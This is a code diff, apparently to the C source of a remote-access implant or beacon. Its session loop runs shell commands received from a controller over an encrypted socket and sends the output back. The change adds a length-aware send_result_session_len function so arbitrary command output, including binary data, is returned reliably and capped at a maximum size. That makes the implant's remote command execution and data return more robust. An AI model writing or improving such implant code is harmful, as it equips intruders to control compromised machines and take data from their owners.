@@ -109,8 +109,16 @@ int safe_session_write(int sock, const uint8_t *data, int len) {
 int send_result_session(int sock, uint32_t label, uint8_t type, uint8_t code,
                         uint16_t flags, const char *output,
                         const uint8_t session_key[32]) {
-    size_t out_len = strlen(output);
-    if (out_len > 65536) out_len = 65536;
+    return send_result_session_len(sock, label, type, code, flags,
+                                   output, output ? strlen(output) : 0,
+                                   session_key);
+}
+
+int send_result_session_len(int sock, uint32_t label, uint8_t type, uint8_t code,
+                            uint16_t flags, const char *output, size_t out_len,
+                            const uint8_t session_key[32]) {
+    if (!output) out_len = 0;
+    if (out_len > MAX_CMD_OUTPUT) out_len = MAX_CMD_OUTPUT;
     size_t body_len = 4 + out_len;
     size_t pkt_len  = 16 + body_len;
 
@@ -129,7 +137,7 @@ int send_result_session(int sock, uint32_t label, uint8_t type, uint8_t code,
     pkt[17] = (uint8_t)(out_len >> 8);
     pkt[18] = (uint8_t)(out_len >> 16);
     pkt[19] = (uint8_t)(out_len >> 24);
-    memcpy(pkt + 20, output, out_len);
+    if (out_len > 0 && output) memcpy(pkt + 20, output, out_len);
 
     size_t enc_len = pkt_len + 64;
     uint8_t *enc = malloc(enc_len);
@@ -276,15 +284,15 @@ void session_loop(int sock, uint8_t *session_key, uint32_t beacon_id,
                 free(builtin_out);
                 size_t out_len = 0;
                 char *output = exec_command_shell(cmd + 6, &out_len);
-                send_result_session(sock, hdr.label, TASK_RUN, CODE_RUN_SHELL,
-                                    FLAG_NONE, output ? output : "", session_key);
+                send_result_session_len(sock, hdr.label, TASK_RUN, CODE_RUN_SHELL,
+                                        FLAG_NONE, output, out_len, session_key);
                 free(output);
             } else {
                 free(builtin_out);
                 size_t out_len = 0;
                 char *output = exec_command(cmd, &out_len);
-                send_result_session(sock, hdr.label, TASK_RUN, CODE_RUN_SHELL,
-                                    FLAG_NONE, output ? output : "", session_key);
+                send_result_session_len(sock, hdr.label, TASK_RUN, CODE_RUN_SHELL,
+                                        FLAG_NONE, output, out_len, session_key);
                 free(output);
             }
         }
